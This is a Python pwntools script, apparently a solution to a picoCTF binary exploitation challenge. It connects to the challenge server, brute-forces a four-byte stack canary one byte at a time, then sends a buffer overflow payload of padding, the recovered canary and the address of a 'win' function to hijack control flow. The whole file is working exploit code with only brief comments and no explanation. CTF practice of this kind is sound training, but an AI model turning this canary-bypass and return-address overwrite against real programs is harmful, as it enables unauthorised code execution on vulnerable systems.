import pwn
import time

elf = pwn.context.binary = pwn.ELF('./vuln')
#io = elf.process()

#Canary is constant -> run again and again until its passed

#Final Payload
#Offset to canary
#Canary
#Offset from canary to return
#win

canOffset = 64
canary = b""
foundCan = False
currentChar = 0x1
i = 1
while foundCan == False:
    #Setup new process
    io = pwn.remote('saturn.picoctf.net',59577)
    io.recv(1000)
    currentCanary = canary + bytes(chr(currentChar),'ASCII')
    #Craft payload
    payload = b""
    payload += b'A'*canOffset
    payload += currentCanary
    totalLen = canOffset + i
    totalLen = (str(totalLen)).encode()
    io.sendline(totalLen)
    io.sendline(payload)
    #Process result
    io.recv(1000)
    result = (io.recv(1000)).decode("ASCII")
    if "Ok..." in result:
        print("Found a char")
        canary = currentCanary
        currentChar = 0x1
        if i == 4:
            foundCan = True
        i += 1
    if "Stack Smashing" in result:
        print("Nothing")
        currentChar += 1
    io.close()

print("Found canary: " + canary.decode("ASCII"))

#Total Number = 64+4+retOffset
retOffset = 16
winAddr = elf.sym['win']

finalPayload = b"".join(
    [
        b'A'*canOffset,
        canary,
        b'C'*retOffset,
        pwn.p32(winAddr)
    ]
)
#io = elf.process()
io = pwn.remote('saturn.picoctf.net',59577)
io.sendline((str(200)).encode())
io.sendline(finalPayload)
io.interactive()




